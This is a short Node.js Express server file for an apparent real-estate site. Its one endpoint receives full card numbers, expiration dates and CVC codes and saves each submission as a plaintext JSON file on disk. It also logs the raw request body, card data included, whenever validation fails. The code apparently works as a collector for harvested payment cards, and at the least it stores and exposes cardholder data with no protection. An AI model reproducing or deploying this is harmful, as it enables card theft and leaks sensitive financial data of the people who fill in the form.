// api/server.js

const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();

// Define allowed origins (add your Vercel domain)
const allowedOrigins = ['http://localhost:3000', 'https://sun-realty-homes-cl.vercel.app'];

app.use(cors({
  origin: function (origin, callback) {
    // Allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) === -1) {
      const msg = 'The CORS policy for this site does not allow access from the specified Origin.';
      return callback(new Error(msg), false);
    }
    return callback(null, true);
  }
}));

app.use(bodyParser.json());

// Endpoint to save form data as a JSON file
app.post('/api/save-data', (req, res) => {
  const { cardNumber, expirationDate, cvcCode } = req.body;

  if (!cardNumber || cardNumber.length !== 16 || !expirationDate || !cvcCode) {
    console.error('Invalid data received:', req.body);
    return res.status(400).json({ message: 'Invalid data' });
  }

  const timestamp = Date.now();
  const filename = `form-data-${timestamp}.json`;

  const filePath = path.join(__dirname, '..', 'data', filename);

  // Create the 'data' directory if it doesn't exist
  if (!fs.existsSync(path.join(__dirname, '..', 'data'))) {
    fs.mkdirSync(path.join(__dirname, '..', 'data'));
  }

  const data = JSON.stringify({ cardNumber, expirationDate, cvcCode }, null, 2);

  // Write data to a JSON file
  fs.writeFile(filePath, data, (err) => {
    if (err) {
      console.error('Error saving data:', err);
      return res.status(500).json({ message: 'Failed to save data' });
    }
    console.log('Data saved successfully:', filename);
    res.status(200).json({ message: 'Data saved successfully', filename });
  });
});

// Export the app
module.exports = app;

// Start the server (for local testing only)
if (process.env.NODE_ENV !== 'production') {
  app.listen(5000, () => {
    console.log('Server running on http://localhost:5000');
  });
}
